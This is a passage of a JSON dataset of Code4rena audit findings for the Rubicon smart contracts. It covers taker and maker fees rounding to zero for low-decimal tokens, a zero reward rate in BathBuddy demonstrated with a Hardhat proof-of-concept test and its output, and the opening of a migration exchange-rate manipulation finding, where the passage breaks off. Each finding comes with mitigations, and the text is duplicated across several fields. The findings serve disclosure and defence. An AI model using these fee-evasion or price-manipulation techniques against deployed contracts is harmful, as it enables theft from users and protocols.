        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nFoundry unit test available here: https://github.com/PierrickGT/2023-04-rubicon/blob/b57d4deac109dc677eafd171b69540c534f24563/test/audit-tests/Audit.t.sol#L165\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586\n\n\n# Vulnerability details\n\n## Impact\n\nIn the `buy` function of the RubiconMarket contract, a fee is subtracted on taker trades.\nThe default `feeBPS` is set to `1` which is equivalent to a fee of `0.01%` or `0.0001` in decimal form.\n\nFor tokens like gUSD with a low decimal precision of [2](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd), no fees will be taken on 3 figure trades since Solidity will round down the result to 0.\n\n## Proof of Concept\n\nThe taker fee is calculated in the `buy` function of the RubiconMarket contract on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) and also in the `calcAmountAfterFee` function on [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).\n\nThe following reasoning also apply to the maker fee on [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346) and [L586](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586).\n\nLet's take for example a 500 gUSD trade, mathematically the fee would be:\n`500 * 0.0001 = 0.05`\n\nIn solidity, for a token with 2 decimal places, we would get:\n`amount * feeBPS / 100_000 = 50000 * 1 / 100_000 = 0` cause it rounds down to 0.\n\nIt would allow a user to not pay any taker and/or maker fee on 3 figure trades.\n\n## Tools Used\n\nFoundry unit test available here: https://github.com/PierrickGT/2023-04-rubicon/blob/b57d4deac109dc677eafd171b69540c534f24563/test/audit-tests/Audit.t.sol#L165\n\n## Recommended Mitigation Steps\n\nYou could either not support these type of tokens or add the following requires.\n\nAdd `require(fee != 0)` to the `buy` function after calculating the fee on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) of the RubiconMarket contract.\n\nAdd the same kind of require for the `makerFee` after [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346).\n\nAnd also add the same kind of require in the `calcAmountAfterFee` function after [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 489,
      "page_start": null,
      "heading": "489. Zero reward rate calculation impedes low-decimals token distributions",
      "heading_cleaned": "Zero reward rate calculation impedes low-decimals token distributions",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L196\n\n\n# Vulnerability details\n\n## Impact\nSeveral (token, distribution period) couples are not feasible in `BathBuddy`, forcing the owner to set shorter distributions or providing more amount of tokens to be distributed.\n\nIn `BathBuddy`, the reward rate of a distribution is calculated following a linear distribution according to the amount of rewards to be distributed across the period:\n\n```solidity\nfunction notifyRewardAmount(\n    uint256 reward,\n    IERC20 rewardsToken\n) external onlyOwner updateReward(address(0), address(rewardsToken)) {\n    if (block.timestamp >= periodFinish[address(rewardsToken)]) {\n        rewardRates[address(rewardsToken)] = reward.div(\n            rewardsDuration[address(rewardsToken)]\n        );\n    } else {\n        uint256 remaining = periodFinish[address(rewardsToken)].sub(\n            block.timestamp\n        );\n        uint256 leftover = remaining.mul(\n            rewardRates[address(rewardsToken)]\n        );\n        rewardRates[address(rewardsToken)] = reward.add(leftover).div(\n            rewardsDuration[address(rewardsToken)]\n        );\n    }\n```\n\nThe rate for each reward token spreads the `reward` amount across the `rewardsDuration`:\n```solidity\nrewardRates[address(rewardsToken)] = reward.div(\n    rewardsDuration[address(rewardsToken)]\n);\n```\nBecause the `SafeMath` implementation as for compiler versions over `0.8.0` execute the legacy division (`a / b`), the reward rate could be zero for some distribution configurations forcing the owner to reduce the duration or increase the reward amount. Bear in mind that the implementation of the `BathBuddy` allows using arbitrary tokens for rewards.\n\n## Proof of Concept\n1. The owner launches a distribution of WBTC and is forced to set a pair of `reward` and `rewardsDuration[address(rewardsToken)]` such that their integer division yields at least in `1`.\n2. Considering that the rate is `1`, the year has (`365 * 24 * 60 * 60 = 31.53e6`) seconds which yields in `0.31536 WBTC` `($8,500 @ 27,000 USD/BTC)` at minimum of rewards per user.\n\nThe following test refactors the `bath-buddy.ts` deploy fixture with the following:\n```bash\n--- a/test/hardhat-tests/bath-buddy.ts\n+++ b/test/hardhat-tests/bath-buddy.ts\n@@ -44,9 +44,9 @@ describe(\"RubiconV2 rewards system\", function () {\n     );\n     const testStableCoin = await testCoinFactory.deploy(\n       owner.address,\n-      \"Test Stablecoin\",\n-      \"TUSDC\",\n-      6\n+      \"Test WBTC\",\n+      \"WBTC\",\n+      8\n     );\n\n-    await testStableCoin.transfer(buddy.address, parseUnits(\"10000\", 6));\n+    await testStableCoin.transfer(buddy.address, parseUnits(\"0.315\", 8));\n     await buddy.notifyRewardAmount(\n-      parseUnits(\"10000\", 6),\n+      parseUnits(\"0.315\", 8),\n+      testStableCoin.address\n+    );\n```\n\nAnd the test is the same as the one provided (`should get rewards from both Comptroller and BathBuddy`) only calculating the amount of rewards received by getting the balance before and after claiming them:\n\n```typescript\n    it(\"gets abusive amount of rewards per year\", async function () {\n      const {\n        owner,\n        testCoin,\n        testStableCoin,\n        testRewardCoin,\n        bathTEST,\n        buddy,\n        bathHouse,\n        comptroller,\n      } = await loadFixture(buddySetupFixtureAudit);\n\n      expect(await comptroller.getCompAddress()).to.be.equal(\n        testRewardCoin.address\n      );\n      const b0 = await testStableCoin.balanceOf(owner.address);\n\n      await testCoin.approve(bathTEST.address, parseUnits(\"1000\"));\n      await bathTEST.mint(parseUnits(\"1000\"));\n\n      const earned = await buddy.earned(owner.address, testStableCoin.address);\n\n      const earnedComp = await testRewardCoin.balanceOf(owner.address);\n      expect(earnedComp).to.be.equal(0);\n\n      // skip a year\n      await time.increaseTo((await time.latest()) + 365 * 24 * 60 * 60);\n\n      bathHouse.claimRewards([buddy.address], [testStableCoin.address]);\n\n      const earned2 = await testStableCoin.balanceOf(owner.address);\n      console.log(`Rewards earned per year: ${earned2.sub(b0)}`)\n      const earnedComp2 = await testRewardCoin.balanceOf(owner.address);\n\n      expect(earned).to.be.lt(earned2);\n      expect(earnedComp).to.be.lt(earnedComp2);\n    });\n```\n\nIt can be seen that setting the distribution amount to `0.315e8` (slightly below the amount of seconds per year) yields in zero rewards:\n\n```bash\nRewards earned per year: 0\n```\n\nAnd setting the distribution amount slightly over the seconds per year (`0.3154e8`) successfully yields in rewards:\n\n```bash\nRewards earned per year: 31536000\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nIncrease the precision scale of the reward rate calculation using a factor (e.g. `10**8`) multiplied to to the `amount` when calculating the distribution's rate.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L196\n\n\n# Vulnerability details\n\n## Impact\nSeveral (token, distribution period) couples are not feasible in `BathBuddy`, forcing the owner to set shorter distributions or providing more amount of tokens to be distributed.\n\nIn `BathBuddy`, the reward rate of a distribution is calculated following a linear distribution according to the amount of rewards to be distributed across the period:\n\n```solidity\nfunction notifyRewardAmount(\n    uint256 reward,\n    IERC20 rewardsToken\n) external onlyOwner updateReward(address(0), address(rewardsToken)) {\n    if (block.timestamp >= periodFinish[address(rewardsToken)]) {\n        rewardRates[address(rewardsToken)] = reward.div(\n            rewardsDuration[address(rewardsToken)]\n        );\n    } else {\n        uint256 remaining = periodFinish[address(rewardsToken)].sub(\n            block.timestamp\n        );\n        uint256 leftover = remaining.mul(\n            rewardRates[address(rewardsToken)]\n        );\n        rewardRates[address(rewardsToken)] = reward.add(leftover).div(\n            rewardsDuration[address(rewardsToken)]\n        );\n    }\n```\n\nThe rate for each reward token spreads the `reward` amount across the `rewardsDuration`:\n```solidity\nrewardRates[address(rewardsToken)] = reward.div(\n    rewardsDuration[address(rewardsToken)]\n);\n```\nBecause the `SafeMath` implementation as for compiler versions over `0.8.0` execute the legacy division (`a / b`), the reward rate could be zero for some distribution configurations forcing the owner to reduce the duration or increase the reward amount. Bear in mind that the implementation of the `BathBuddy` allows using arbitrary tokens for rewards.\n\n## Proof of Concept\n1. The owner launches a distribution of WBTC and is forced to set a pair of `reward` and `rewardsDuration[address(rewardsToken)]` such that their integer division yields at least in `1`.\n2. Considering that the rate is `1`, the year has (`365 * 24 * 60 * 60 = 31.53e6`) seconds which yields in `0.31536 WBTC` `($8,500 @ 27,000 USD/BTC)` at minimum of rewards per user.\n\nThe following test refactors the `bath-buddy.ts` deploy fixture with the following:\n```bash\n--- a/test/hardhat-tests/bath-buddy.ts\n+++ b/test/hardhat-tests/bath-buddy.ts\n@@ -44,9 +44,9 @@ describe(\"RubiconV2 rewards system\", function () {\n     );\n     const testStableCoin = await testCoinFactory.deploy(\n       owner.address,\n-      \"Test Stablecoin\",\n-      \"TUSDC\",\n-      6\n+      \"Test WBTC\",\n+      \"WBTC\",\n+      8\n     );\n\n-    await testStableCoin.transfer(buddy.address, parseUnits(\"10000\", 6));\n+    await testStableCoin.transfer(buddy.address, parseUnits(\"0.315\", 8));\n     await buddy.notifyRewardAmount(\n-      parseUnits(\"10000\", 6),\n+      parseUnits(\"0.315\", 8),\n+      testStableCoin.address\n+    );\n```\n\nAnd the test is the same as the one provided (`should get rewards from both Comptroller and BathBuddy`) only calculating the amount of rewards received by getting the balance before and after claiming them:\n\n```typescript\n    it(\"gets abusive amount of rewards per year\", async function () {\n      const {\n        owner,\n        testCoin,\n        testStableCoin,\n        testRewardCoin,\n        bathTEST,\n        buddy,\n        bathHouse,\n        comptroller,\n      } = await loadFixture(buddySetupFixtureAudit);\n\n      expect(await comptroller.getCompAddress()).to.be.equal(\n        testRewardCoin.address\n      );\n      const b0 = await testStableCoin.balanceOf(owner.address);\n\n      await testCoin.approve(bathTEST.address, parseUnits(\"1000\"));\n      await bathTEST.mint(parseUnits(\"1000\"));\n\n      const earned = await buddy.earned(owner.address, testStableCoin.address);\n\n      const earnedComp = await testRewardCoin.balanceOf(owner.address);\n      expect(earnedComp).to.be.equal(0);\n\n      // skip a year\n      await time.increaseTo((await time.latest()) + 365 * 24 * 60 * 60);\n\n      bathHouse.claimRewards([buddy.address], [testStableCoin.address]);\n\n      const earned2 = await testStableCoin.balanceOf(owner.address);\n      console.log(`Rewards earned per year: ${earned2.sub(b0)}`)\n      const earnedComp2 = await testRewardCoin.balanceOf(owner.address);\n\n      expect(earned).to.be.lt(earned2);\n      expect(earnedComp).to.be.lt(earnedComp2);\n    });\n```\n\nIt can be seen that setting the distribution amount to `0.315e8` (slightly below the amount of seconds per year) yields in zero rewards:\n\n```bash\nRewards earned per year: 0\n```\n\nAnd setting the distribution amount slightly over the seconds per year (`0.3154e8`) successfully yields in rewards:\n\n```bash\nRewards earned per year: 31536000\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nIncrease the precision scale of the reward rate calculation using a factor (e.g. `10**8`) multiplied to to the `amount` when calculating the distribution's rate.\n",
      "description": null,
      "impact": "## Impact\nSeveral (token, distribution period) couples are not feasible in `BathBuddy`, forcing the owner to set shorter distributions or providing more amount of tokens to be distributed.\n\nIn `BathBuddy`, the reward rate of a distribution is calculated following a linear distribution according to the amount of rewards to be distributed across the period:\n\n```solidity\nfunction notifyRewardAmount(\n    uint256 reward,\n    IERC20 rewardsToken\n) external onlyOwner updateReward(address(0), address(rewardsToken)) {\n    if (block.timestamp >= periodFinish[address(rewardsToken)]) {\n        rewardRates[address(rewardsToken)] = reward.div(\n            rewardsDuration[address(rewardsToken)]\n        );\n    } else {\n        uint256 remaining = periodFinish[address(rewardsToken)].sub(\n            block.timestamp\n        );\n        uint256 leftover = remaining.mul(\n            rewardRates[address(rewardsToken)]\n        );\n        rewardRates[address(rewardsToken)] = reward.add(leftover).div(\n            rewardsDuration[address(rewardsToken)]\n        );\n    }\n```\n\nThe rate for each reward token spreads the `reward` amount across the `rewardsDuration`:\n```solidity\nrewardRates[address(rewardsToken)] = reward.div(\n    rewardsDuration[address(rewardsToken)]\n);\n```\nBecause the `SafeMath` implementation as for compiler versions over `0.8.0` execute the legacy division (`a / b`), the reward rate could be zero for some distribution configurations forcing the owner to reduce the duration or increase the reward amount. Bear in mind that the implementation of the `BathBuddy` allows using arbitrary tokens for rewards.\n",
      "mitigation": "## Recommended Mitigation Steps\nIncrease the precision scale of the reward rate calculation using a factor (e.g. `10**8`) multiplied to to the `amount` when calculating the distribution's rate.\n",
      "poc": "## Proof of Concept\n1. The owner launches a distribution of WBTC and is forced to set a pair of `reward` and `rewardsDuration[address(rewardsToken)]` such that their integer division yields at least in `1`.\n2. Considering that the rate is `1`, the year has (`365 * 24 * 60 * 60 = 31.53e6`) seconds which yields in `0.31536 WBTC` `($8,500 @ 27,000 USD/BTC)` at minimum of rewards per user.\n\nThe following test refactors the `bath-buddy.ts` deploy fixture with the following:\n```bash\n--- a/test/hardhat-tests/bath-buddy.ts\n+++ b/test/hardhat-tests/bath-buddy.ts\n@@ -44,9 +44,9 @@ describe(\"RubiconV2 rewards system\", function () {\n     );\n     const testStableCoin = await testCoinFactory.deploy(\n       owner.address,\n-      \"Test Stablecoin\",\n-      \"TUSDC\",\n-      6\n+      \"Test WBTC\",\n+      \"WBTC\",\n+      8\n     );\n\n-    await testStableCoin.transfer(buddy.address, parseUnits(\"10000\", 6));\n+    await testStableCoin.transfer(buddy.address, parseUnits(\"0.315\", 8));\n     await buddy.notifyRewardAmount(\n-      parseUnits(\"10000\", 6),\n+      parseUnits(\"0.315\", 8),\n+      testStableCoin.address\n+    );\n```\n\nAnd the test is the same as the one provided (`should get rewards from both Comptroller and BathBuddy`) only calculating the amount of rewards received by getting the balance before and after claiming them:\n\n```typescript\n    it(\"gets abusive amount of rewards per year\", async function () {\n      const {\n        owner,\n        testCoin,\n        testStableCoin,\n        testRewardCoin,\n        bathTEST,\n        buddy,\n        bathHouse,\n        comptroller,\n      } = await loadFixture(buddySetupFixtureAudit);\n\n      expect(await comptroller.getCompAddress()).to.be.equal(\n        testRewardCoin.address\n      );\n      const b0 = await testStableCoin.balanceOf(owner.address);\n\n      await testCoin.approve(bathTEST.address, parseUnits(\"1000\"));\n      await bathTEST.mint(parseUnits(\"1000\"));\n\n      const earned = await buddy.earned(owner.address, testStableCoin.address);\n\n      const earnedComp = await testRewardCoin.balanceOf(owner.address);\n      expect(earnedComp).to.be.equal(0);\n\n      // skip a year\n      await time.increaseTo((await time.latest()) + 365 * 24 * 60 * 60);\n\n      bathHouse.claimRewards([buddy.address], [testStableCoin.address]);\n\n      const earned2 = await testStableCoin.balanceOf(owner.address);\n      console.log(`Rewards earned per year: ${earned2.sub(b0)}`)\n      const earnedComp2 = await testRewardCoin.balanceOf(owner.address);\n\n      expect(earned).to.be.lt(earned2);\n      expect(earnedComp).to.be.lt(earnedComp2);\n    });\n```\n\nIt can be seen that setting the distribution amount to `0.315e8` (slightly below the amount of seconds per year) yields in zero rewards:\n\n```bash\nRewards earned per year: 0\n```\n\nAnd setting the distribution amount slightly over the seconds per year (`0.3154e8`) successfully yields in rewards:\n\n```bash\nRewards earned per year: 31536000\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L196\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nSeveral (token, distribution period) couples are not feasible in `BathBuddy`, forcing the owner to set shorter distributions or providing more amount of tokens to be distributed.\n\nIn `BathBuddy`, the reward rate of a distribution is calculated following a linear distribution according to the amount of rewards to be distributed across the period:\n\n```solidity\nfunction notifyRewardAmount(\n    uint256 reward,\n    IERC20 rewardsToken\n) external onlyOwner updateReward(address(0), address(rewardsToken)) {\n    if (block.timestamp >= periodFinish[address(rewardsToken)]) {\n        rewardRates[address(rewardsToken)] = reward.div(\n            rewardsDuration[address(rewardsToken)]\n        );\n    } else {\n        uint256 remaining = periodFinish[address(rewardsToken)].sub(\n            block.timestamp\n        );\n        uint256 leftover = remaining.mul(\n            rewardRates[address(rewardsToken)]\n        );\n        rewardRates[address(rewardsToken)] = reward.add(leftover).div(\n            rewardsDuration[address(rewardsToken)]\n        );\n    }\n```\n\nThe rate for each reward token spreads the `reward` amount across the `rewardsDuration`:\n```solidity\nrewardRates[address(rewardsToken)] = reward.div(\n    rewardsDuration[address(rewardsToken)]\n);\n```\nBecause the `SafeMath` implementation as for compiler versions over `0.8.0` execute the legacy division (`a / b`), the reward rate could be zero for some distribution configurations forcing the owner to reduce the duration or increase the reward amount. Bear in mind that the implementation of the `BathBuddy` allows using arbitrary tokens for rewards.\n",
        "recommendation": "## Recommended Mitigation Steps\nIncrease the precision scale of the reward rate calculation using a factor (e.g. `10**8`) multiplied to to the `amount` when calculating the distribution's rate.\n",
        "poc": "## Proof of Concept\n1. The owner launches a distribution of WBTC and is forced to set a pair of `reward` and `rewardsDuration[address(rewardsToken)]` such that their integer division yields at least in `1`.\n2. Considering that the rate is `1`, the year has (`365 * 24 * 60 * 60 = 31.53e6`) seconds which yields in `0.31536 WBTC` `($8,500 @ 27,000 USD/BTC)` at minimum of rewards per user.\n\nThe following test refactors the `bath-buddy.ts` deploy fixture with the following:\n```bash\n--- a/test/hardhat-tests/bath-buddy.ts\n+++ b/test/hardhat-tests/bath-buddy.ts\n@@ -44,9 +44,9 @@ describe(\"RubiconV2 rewards system\", function () {\n     );\n     const testStableCoin = await testCoinFactory.deploy(\n       owner.address,\n-      \"Test Stablecoin\",\n-      \"TUSDC\",\n-      6\n+      \"Test WBTC\",\n+      \"WBTC\",\n+      8\n     );\n\n-    await testStableCoin.transfer(buddy.address, parseUnits(\"10000\", 6));\n+    await testStableCoin.transfer(buddy.address, parseUnits(\"0.315\", 8));\n     await buddy.notifyRewardAmount(\n-      parseUnits(\"10000\", 6),\n+      parseUnits(\"0.315\", 8),\n+      testStableCoin.address\n+    );\n```\n\nAnd the test is the same as the one provided (`should get rewards from both Comptroller and BathBuddy`) only calculating the amount of rewards received by getting the balance before and after claiming them:\n\n```typescript\n    it(\"gets abusive amount of rewards per year\", async function () {\n      const {\n        owner,\n        testCoin,\n        testStableCoin,\n        testRewardCoin,\n        bathTEST,\n        buddy,\n        bathHouse,\n        comptroller,\n      } = await loadFixture(buddySetupFixtureAudit);\n\n      expect(await comptroller.getCompAddress()).to.be.equal(\n        testRewardCoin.address\n      );\n      const b0 = await testStableCoin.balanceOf(owner.address);\n\n      await testCoin.approve(bathTEST.address, parseUnits(\"1000\"));\n      await bathTEST.mint(parseUnits(\"1000\"));\n\n      const earned = await buddy.earned(owner.address, testStableCoin.address);\n\n      const earnedComp = await testRewardCoin.balanceOf(owner.address);\n      expect(earnedComp).to.be.equal(0);\n\n      // skip a year\n      await time.increaseTo((await time.latest()) + 365 * 24 * 60 * 60);\n\n      bathHouse.claimRewards([buddy.address], [testStableCoin.address]);\n\n      const earned2 = await testStableCoin.balanceOf(owner.address);\n      console.log(`Rewards earned per year: ${earned2.sub(b0)}`)\n      const earnedComp2 = await testRewardCoin.balanceOf(owner.address);\n\n      expect(earned).to.be.lt(earned2);\n      expect(earnedComp).to.be.lt(earnedComp2);\n    });\n```\n\nIt can be seen that setting the distribution amount to `0.315e8` (slightly below the amount of seconds per year) yields in zero rewards:\n\n```bash\nRewards earned per year: 0\n```\n\nAnd setting the distribution amount slightly over the seconds per year (`0.3154e8`) successfully yields in rewards:\n\n```bash\nRewards earned per year: 31536000\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L196\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L196\n\n\n# Vulnerability details\n\n## Impact\nSeveral (token, distribution period) couples are not feasible in `BathBuddy`, forcing the owner to set shorter distributions or providing more amount of tokens to be distributed.\n\nIn `BathBuddy`, the reward rate of a distribution is calculated following a linear distribution according to the amount of rewards to be distributed across the period:\n\n```solidity\nfunction notifyRewardAmount(\n    uint256 reward,\n    IERC20 rewardsToken\n) external onlyOwner updateReward(address(0), address(rewardsToken)) {\n    if (block.timestamp >= periodFinish[address(rewardsToken)]) {\n        rewardRates[address(rewardsToken)] = reward.div(\n            rewardsDuration[address(rewardsToken)]\n        );\n    } else {\n        uint256 remaining = periodFinish[address(rewardsToken)].sub(\n            block.timestamp\n        );\n        uint256 leftover = remaining.mul(\n            rewardRates[address(rewardsToken)]\n        );\n        rewardRates[address(rewardsToken)] = reward.add(leftover).div(\n            rewardsDuration[address(rewardsToken)]\n        );\n    }\n```\n\nThe rate for each reward token spreads the `reward` amount across the `rewardsDuration`:\n```solidity\nrewardRates[address(rewardsToken)] = reward.div(\n    rewardsDuration[address(rewardsToken)]\n);\n```\nBecause the `SafeMath` implementation as for compiler versions over `0.8.0` execute the legacy division (`a / b`), the reward rate could be zero for some distribution configurations forcing the owner to reduce the duration or increase the reward amount. Bear in mind that the implementation of the `BathBuddy` allows using arbitrary tokens for rewards.\n\n## Proof of Concept\n1. The owner launches a distribution of WBTC and is forced to set a pair of `reward` and `rewardsDuration[address(rewardsToken)]` such that their integer division yields at least in `1`.\n2. Considering that the rate is `1`, the year has (`365 * 24 * 60 * 60 = 31.53e6`) seconds which yields in `0.31536 WBTC` `($8,500 @ 27,000 USD/BTC)` at minimum of rewards per user.\n\nThe following test refactors the `bath-buddy.ts` deploy fixture with the following:\n```bash\n--- a/test/hardhat-tests/bath-buddy.ts\n+++ b/test/hardhat-tests/bath-buddy.ts\n@@ -44,9 +44,9 @@ describe(\"RubiconV2 rewards system\", function () {\n     );\n     const testStableCoin = await testCoinFactory.deploy(\n       owner.address,\n-      \"Test Stablecoin\",\n-      \"TUSDC\",\n-      6\n+      \"Test WBTC\",\n+      \"WBTC\",\n+      8\n     );\n\n-    await testStableCoin.transfer(buddy.address, parseUnits(\"10000\", 6));\n+    await testStableCoin.transfer(buddy.address, parseUnits(\"0.315\", 8));\n     await buddy.notifyRewardAmount(\n-      parseUnits(\"10000\", 6),\n+      parseUnits(\"0.315\", 8),\n+      testStableCoin.address\n+    );\n```\n\nAnd the test is the same as the one provided (`should get rewards from both Comptroller and BathBuddy`) only calculating the amount of rewards received by getting the balance before and after claiming them:\n\n```typescript\n    it(\"gets abusive amount of rewards per year\", async function () {\n      const {\n        owner,\n        testCoin,\n        testStableCoin,\n        testRewardCoin,\n        bathTEST,\n        buddy,\n        bathHouse,\n        comptroller,\n      } = await loadFixture(buddySetupFixtureAudit);\n\n      expect(await comptroller.getCompAddress()).to.be.equal(\n        testRewardCoin.address\n      );\n      const b0 = await testStableCoin.balanceOf(owner.address);\n\n      await testCoin.approve(bathTEST.address, parseUnits(\"1000\"));\n      await bathTEST.mint(parseUnits(\"1000\"));\n\n      const earned = await buddy.earned(owner.address, testStableCoin.address);\n\n      const earnedComp = await testRewardCoin.balanceOf(owner.address);\n      expect(earnedComp).to.be.equal(0);\n\n      // skip a year\n      await time.increaseTo((await time.latest()) + 365 * 24 * 60 * 60);\n\n      bathHouse.claimRewards([buddy.address], [testStableCoin.address]);\n\n      const earned2 = await testStableCoin.balanceOf(owner.address);\n      console.log(`Rewards earned per year: ${earned2.sub(b0)}`)\n      const earnedComp2 = await testRewardCoin.balanceOf(owner.address);\n\n      expect(earned).to.be.lt(earned2);\n      expect(earnedComp).to.be.lt(earnedComp2);\n    });\n```\n\nIt can be seen that setting the distribution amount to `0.315e8` (slightly below the amount of seconds per year) yields in zero rewards:\n\n```bash\nRewards earned per year: 0\n```\n\nAnd setting the distribution amount slightly over the seconds per year (`0.3154e8`) successfully yields in rewards:\n\n```bash\nRewards earned per year: 31536000\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nIncrease the precision scale of the reward rate calculation using a factor (e.g. `10**8`) multiplied to to the `amount` when calculating the distribution's rate.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 497,
      "page_start": null,
      "heading": "497. Users might get less assets than expected upon migration due to price manipulation attacks",
      "heading_cleaned": "Users might get less assets than expected upon migration due to price manipulation attacks",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/V2Migrator.sol#L38\n\n\n# Vulnerability details\n\n## Impact\nIt is possible to manipulate the price of BathV2 tokens before a migration and consequently the migrator will receive underpriced V2 tokens, incurring losses.\n\nThe migration process of `V2Migrator.migrate()` hands in the user's `BathV1` balance in exchange of its underlying. Then, proceeds to mint the counterpart of `BathV2` tokens providing the same amount of recovered underlying tokens:\n\n```solidity\nfunction migrate(IBathToken bathTokenV1) external {\n    //////////////// V1 WITHDRAWAL ////////////////\n    uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);\n    require(bathBalance > 0, \"migrate: ZERO AMOUNT\");\n\n    /// @dev approve first\n    bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);\n\n    // withdraw all tokens from the pool\n    uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);\n\n    //////////////// V2 DEPOSIT ////////////////\n    IERC20 underlying = bathTokenV1.underlyingToken();\n    address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];\n\n    underlying.approve(bathTokenV2, amountWithdrawn);\n    require(\n        CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,\n        \"migrate: MINT FAILED\"\n    );\n    /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function\n    IERC20(bathTokenV2).transfer(\n        msg.sender,\n        IERC20(bathTokenV2).balanceOf(address(this))\n    );\n    ...\n}\n```\nThis process can be abused from external actors when the V2 pool has low liquidity to manipulate the price of the V2 tokens considerably changing the amount of V2 tokens received by the migrating user.\n\nThe amount of V2 tokens (`CTokens`) that are minted are calculated after accruing the respective interests in `CToken.mintFresh()`:\n\n```solidity\nfunction mintFresh(address minter, uint mintAmount) internal {\n    // ... minting checks  ...\n\n    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});\n\n    uint mintTokens = div_(actualMintAmount, exchangeRate);\n\n    /*\n    * We calculate the new total supply of cTokens and minter token balance, checking for overflow:\n    *  totalSupplyNew = totalSupply + mintTokens\n    *  accountTokensNew = accountTokens[minter] + mintTokens\n    * And write them into storage\n    */\n    totalSupply = totalSupply + mintTokens;\n    accountTokens[minter] = accountTokens[minter] + mintTokens;\n\n    /* We emit a Mint event, and a Transfer event */\n    emit Mint(minter, actualMintAmount, mintTokens);\n    emit Transfer(address(this), minter, mintTokens);\n\n    /* We call the defense hook */\n    // unused function\n    // comptroller.mintVerify(address(this), minter, actualMintAmount, mintTokens);\n\n}\n```\nAn attacker is able to manipulate the `exchangeRate` so it harms the subsequent minters:\n\n```solidity\nfunction exchangeRateStoredInternal() virtual internal view returns (uint) {\n    uint _totalSupply = totalSupply;\n    if (_totalSupply == 0) {\n        /*\n            * If there are no tokens minted:\n            *  exchangeRate = initialExchangeRate\n            */\n        return initialExchangeRateMantissa;\n    } else {\n        /*\n            * Otherwise:\n            *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply\n            */\n        uint totalCash = getCashPrior();\n        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;\n        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;\n\n        return exchangeRate;\n    }\n}\n```\n\nEssentially, more tokens will be minted if the rate is decreased as it is dividing the `actualMintAmount`, which could be done by increasing the `totalSupply`. The opposite effect can be done by increasing the `totalCash` or the `totalBorrows`, for example.\n\n## Proof of Concept\nThis scenario can be abused by attackers willing to harm other users that 